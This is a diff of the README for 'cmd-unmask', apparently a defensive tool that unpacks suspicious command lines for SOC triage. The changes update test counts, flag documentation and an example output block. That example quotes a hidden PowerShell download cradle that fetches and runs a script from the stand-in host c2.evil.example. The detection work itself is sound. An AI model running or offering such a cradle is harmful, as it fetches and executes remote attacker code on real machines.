@@ -6,7 +6,7 @@
 
 [![Python 3.10+ stdlib-only](https://img.shields.io/badge/python-3.10%2B%20stdlib--only-blue.svg)](#)
 [![Dependencies: Zero](https://img.shields.io/badge/dependencies-zero-009688.svg)](#)
-[![Tests](https://img.shields.io/badge/tests-148%20passed-success.svg)](#)
+[![Tests](https://img.shields.io/badge/tests-149%20passed-success.svg)](#)
 [![FPR: 0.0000](https://img.shields.io/badge/FPR-0.0000%20(67%20fixtures)-brightgreen.svg)](#)
 
 [Quickstart](#quickstart) · [Architecture](#architecture) · [Detection Rigidity](#detection-rigidity) · [CLI Reference](#cli-reference) · [ADRs](docs/adr/README.md)
@@ -67,8 +67,8 @@ pip install -e .
 ### Zero-Flag & Tactical Workflows
 
 ```bash
-# 1. Zero-flag clipboard triage (auto-detects raw commands or SIEM JSON/JSONL,
-#    auto-copies [SOC TRIAGE NOTE], and emits Sigma YAML on non-benign TTY runs)
+# 1. Zero-flag clipboard triage (auto-detects raw commands or SIEM JSON/JSONL;
+#    pass --copy-note to copy [SOC TRIAGE NOTE] or --sigma to emit Sigma YAML)
 cmd-unmask
 
 # 2. Positional auto-detect (file path -> batch SIEM ingestion; string -> single command)
@@ -85,7 +85,7 @@ cmd-unmask -c "cmd.exe /c whoami" --parent "C:\Windows\System32\inetsrv\w3wp.exe
 cmd-unmask --benchmark -v
 ```
 
-### Example Output (`--format pretty --no-color --no-sigma`)
+### Example Output (`--format pretty --no-color`)
 
 ```text
 +----------------------------------------------------------------------------+
@@ -96,9 +96,8 @@ cmd-unmask --benchmark -v
 |                 Key flags: -NoP / -NoProfile.                              |
 +----------------------------------------------------------------------------+
 
-[1] UNMASKING TIMELINE (LAYER-BY-LAYER)
-  +-- Step 0 [Raw Input]
-      powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
+[1] PAYLOAD
+  +-- powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')
 
 [2] BEHAVIORAL EVIDENCE & CAPABILITIES
   |-- T1059.001 (Execution) - PowerShell Suspicious Execution / Cradle: -W Hidden (Step 0 [Raw Input])
@@ -113,8 +112,6 @@ cmd-unmask --benchmark -v
 
 [4] RECOMMENDED L1/L2 NEXT STEPS
   +-- 1. Hunt and block network target(s) (hxxp://c2[.]evil[.]example[:]8080/stage.ps1, c2[.]evil[.]example) across firewall, proxy, and DNS logs.
-
-[i] SOC Ticket Note omitted on stdout (use --show-note to print)
 ```
 
 ---
@@ -192,7 +189,7 @@ Matches `python -m cmd_unmask --help`:
 ### Development & Testing
 
 ```bash
-# Run full unit and integration test suite (148 tests)
+# Run full unit and integration test suite (149 tests)
 python -m unittest discover -s tests -v
 
 # Run Regression Corpus benchmark and Detection Rigidity Gate
